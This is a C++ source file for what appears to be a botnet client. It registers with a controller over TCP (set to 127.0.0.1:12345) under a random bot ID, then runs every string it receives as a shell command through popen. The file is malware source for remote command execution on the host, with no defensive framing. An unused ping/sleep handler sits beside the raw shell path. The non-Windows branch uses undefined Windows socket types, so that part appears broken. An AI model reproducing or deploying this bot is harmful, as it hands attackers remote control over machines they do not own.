#include <iostream>
#include <string>
#include <sstream>
#include <cstdlib>
#include <ctime>
#include <thread>
#include <chrono>
#include <random>
#include <array>
#include <memory>
#include <stdexcept>
#ifdef _WIN32
#include <winsock2.h>
#include <ws2tcpip.h>
#include <windows.h>
#pragma comment(lib, "ws2_32.lib")
#else
#include <sys/socket.h>
#include <netinet/in.h>
#include <arpa/inet.h>
#include <unistd.h>
#include <stdio.h>
#endif

using namespace std;

const string CONTROLLER_IP = "127.0.0.1";
const int CONTROLLER_PORT = 12345;

#ifdef _WIN32
bool initialize_winsock() {
    WSADATA wsaData;
    int result = WSAStartup(MAKEWORD(2, 2), &wsaData);
    if (result != 0) {
        cerr << "WSAStartup failed: " << result << endl;
        return false;
    }
    return true;
}
#endif

string generate_bot_id() {
    random_device rd;
    mt19937 gen(rd());
    uniform_int_distribution<> distrib(1000, 9999);

    return to_string(distrib(gen));
}

string BOT_ID = generate_bot_id();

#ifdef _WIN32
string exec(const char* cmd) {
    array < char, 128 > buffer;
    string result;
    unique_ptr<FILE, decltype(&_pclose)> pipe(_popen(cmd, "r"), _pclose);
    if (!pipe) {
        throw runtime_error("popen() failed");
    }
    while (fgets(buffer.data(), buffer.size(), pipe.get()) != nullptr) {
        result += buffer.data();
    }
    return result;
}
#else
string exec(const char* cmd) {
    array<char, 128> buffer;
    string result;
    unique_ptr<FILE, decltype(&pclose)> pipe(popen(cmd, "r"), pclose);
    if (!pipe) {
        throw std::runtime_error("popen() failed!");
    }
    while (fgets(buffer.data(), buffer.size(), pipe.get()) != nullptr) {
        result += buffer.data();
    }
    return result;
}
#endif

bool register_with_controller(SOCKET& sock) {
    try {
        sockaddr_in server_address;
        server_address.sin_family = AF_INET;
        server_address.sin_port = htons(CONTROLLER_PORT);

        if (inet_pton(AF_INET, CONTROLLER_IP.c_str(), &(server_address.sin_addr)) <= 0) {
            cerr << "inet_pton failed for IP address: " << CONTROLLER_IP << endl;
            return false;
        }

        if (connect(sock, (sockaddr*)&server_address, sizeof(server_address)) == SOCKET_ERROR) {
            cerr << "Connection failed. Error: " <<
#ifdef _WIN32
                WSAGetLastError()
#else
                errno
#endif
                << endl;
            return false;
        }

        string message = "{\"bot_id\": \"" + BOT_ID + "\", \"action\": \"register\"}";
        if (send(sock, message.c_str(), message.length(), 0) == SOCKET_ERROR) {
            cerr << "Send failed. Error: " <<
#ifdef _WIN32
                WSAGetLastError()
#else
                errno
#endif
                << endl;
            return false;
        }

        char buffer[1024];
        int bytes_received = recv(sock, buffer, sizeof(buffer) - 1, 0);
        if (bytes_received > 0) {
            buffer[bytes_received] = '\0';
            cout << "Response from controller: " << buffer << endl;
        }
        else {
            cerr << "Error receiving data from controller. Error: " <<
#ifdef _WIN32
                WSAGetLastError()
#else
                errno
#endif
                << endl;
            return false;
        }

        return true;
    }
    catch (const exception& e) {
        cerr << "Exception in register_with_controller: " << e.what() << endl;
        return false;
    }
}

void execute_command(const string& command) {

    cout << "Executing command: " << command << endl;
    if (command == "ping") {
        cout << "Bot " << BOT_ID << ": Pong!" << endl;
    }
    else if (command == "sleep") {
        random_device rd;
        mt19937 gen(rd());
        uniform_int_distribution<> distrib(1, 5); // Range 1-5 seconds

        int sleep_time = distrib(gen);

        cout << "Bot " << BOT_ID << ": Sleeping for " << sleep_time << " seconds..." << endl;
        this_thread::sleep_for(chrono::seconds(sleep_time));
        cout << "Bot " << BOT_ID << ": Woke up!" << endl;
    }
    else {
        cout << "Bot " << BOT_ID << ": Unknown command: " << command << endl;
    }
}


int main() {

#ifdef _WIN32
    if (!initialize_winsock()) {
        return 1;
    }
#endif

    SOCKET sock = socket(AF_INET, SOCK_STREAM, 0);
    if (sock == INVALID_SOCKET) {
        cerr << "Could not create socket. Error: " <<
#ifdef _WIN32
            WSAGetLastError()
#else
            errno
#endif
            << endl;
        return 1;
    }

    if (!register_with_controller(sock)) {
        closesocket(sock);
        return 1;
    }


    while (true) {
        char buffer[1024];
        int bytes_received = recv(sock, buffer, sizeof(buffer) - 1, 0);

        if (bytes_received > 0) {
            buffer[bytes_received] = '\0';
            string command(buffer);
            cout << "Received command: " << command << endl;

            try {
                string result = exec(command.c_str());
                cout << "Command execution result:\n" << result << endl;
            }
            catch (const std::runtime_error& e) {
                cerr << "Error executing command: " << e.what() << endl;
            }
        }
        else if (bytes_received == 0) {
            cout << "Controller disconnected." << endl;
            break;
        }
        else {
            cerr << "Error receiving data. Error: " <<
#ifdef _WIN32
                WSAGetLastError()
#else
                errno
#endif
                << endl;
            break;
        }
    }

    closesocket(sock);
#ifdef _WIN32
    WSACleanup();
#endif
    return 0;
}